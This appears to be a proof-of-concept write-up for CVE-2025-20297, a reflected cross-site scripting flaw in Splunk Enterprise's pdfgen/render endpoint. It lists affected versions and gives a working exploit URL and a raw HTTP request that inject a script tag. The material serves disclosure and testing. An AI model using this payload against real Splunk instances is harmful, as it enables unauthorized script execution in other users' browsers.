## CVE-2025-20297
## VULNERABILITY DETAILS
Reflected Cross-Site Scripting (XSS) on Splunk Enterprise through dashboard PDF generation component

## Description
In Splunk Enterprise versions below 9.4.2, 9.3.4 and 9.2.6, and Splunk Cloud Platform versions below 9.3.2411.102, 9.3.2408.111 and 9.2.2406.118, a low-privileged user that does not hold the “admin” or “power” Splunk roles could craft a malicious payload through the pdfgen/render REST endpoint that could result in execution of unauthorized JavaScript code in the browser of a user.

## VULNERABILITY
splunk-9.3.0-51ccf43db5bd-linux-2.6-amd64 (tested)

## Diff splunk-9.3.0-51ccf43db5bd-linux-2.6-amd64 VS splunk-9.3.4-30e72d3fb5f7-linux-2.6-amd64
Download: https://download.splunk.com/products/splunk/releases/9.3.0/linux/splunk-9.3.0-51ccf43db5bd-linux-2.6-amd64.deb
Download: https://download.splunk.com/products/splunk/releases/9.3.4/linux/splunk-9.3.4-30e72d3fb5f7-linux-2.6-amd64.deb

![image](https://github.com/user-attachments/assets/28686a3c-3b89-4ffb-94f7-205276b7ae73)


## Exploit:
Require login => execute javascript
```
http://<Host>:8000/en-US/splunkd/__raw/services/pdfgen/render?type=<script>alert(document.domain)</script>

```
```
GET /services/pdfgen/render?type=<script>alert(document.domain)</script> HTTP/1.1
Host: <Host>:8089
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Connection: close
Cache-Control: max-age=0
Authorization: Basic username:password
```


https://github.com/user-attachments/assets/5d08ed56-0a1b-42f2-8b99-f8e0aaac782d




## References:
- https://advisory.splunk.com/advisories/SVD-2025-0601
- https://nvd.nist.gov/vuln/detail/CVE-2025-20297
- https://www.fosstechnix.com/how-to-install-splunk-on-ubuntu-24-04-lts/
